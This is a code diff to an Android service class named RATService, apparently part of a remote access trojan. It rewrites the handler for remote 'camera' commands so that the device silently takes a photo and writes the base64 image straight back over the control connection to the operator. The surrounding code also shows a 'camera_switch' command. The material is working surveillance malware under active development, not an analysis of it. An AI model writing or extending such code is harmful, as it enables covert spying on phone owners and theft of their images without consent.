@@ -554,28 +554,44 @@ public class RATService extends Service {
                 break;
                 
             // CAMERA COMMANDS - FIXED: Removed duplicate case
-            case "camera":
-            case "camera_photo":
-                if (cameraModule != null) {
-                    Log.d(TAG, "📸 Taking photo with camera module");
-                    cameraModule.takePhoto(new CameraModule.CameraCallback() {
-                        @Override
-                        public void onPhotoTaken(String base64Image) {
-                            Log.d(TAG, "📸 Photo taken, sending response");
-                            sendCommand(base64Image);
-                        }
-                        
-                        @Override
-                        public void onError(String error) {
-                            Log.e(TAG, "📸 Camera error: " + error);
-                            sendCommand(error);
-                        }
-                    });
-                } else {
-                    Log.e(TAG, "📸 Camera module is null");
-                    sendCommand("CAMERA|ERROR: Camera module not available");
+          case "camera":
+case "camera_photo":
+    if (cameraModule != null) {
+        Log.d(TAG, "📸 Taking photo with camera module");
+        cameraModule.takePhoto(new CameraModule.CameraCallback() {
+            @Override
+            public void onPhotoTaken(String base64Image) {
+                Log.d(TAG, "📸 Photo taken, sending response, length: " + base64Image.length());
+                // Send directly without chunking for camera images
+                if (out != null) {
+                    try {
+                        out.println(base64Image);
+                        out.flush();
+                        Log.d(TAG, "📸 Camera response sent");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error sending camera response", e);
+                    }
                 }
-                break;
+            }
+            
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "📸 Camera error: " + error);
+                if (out != null) {
+                    try {
+                        out.println(error);
+                        out.flush();
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error sending error", e);
+                    }
+                }
+            }
+        });
+    } else {
+        Log.e(TAG, "📸 Camera module is null");
+        sendCommand("CAMERA|ERROR: Camera module not available");
+    }
+    break;
                 
             case "camera_switch":
                 if (cameraModule != null) {
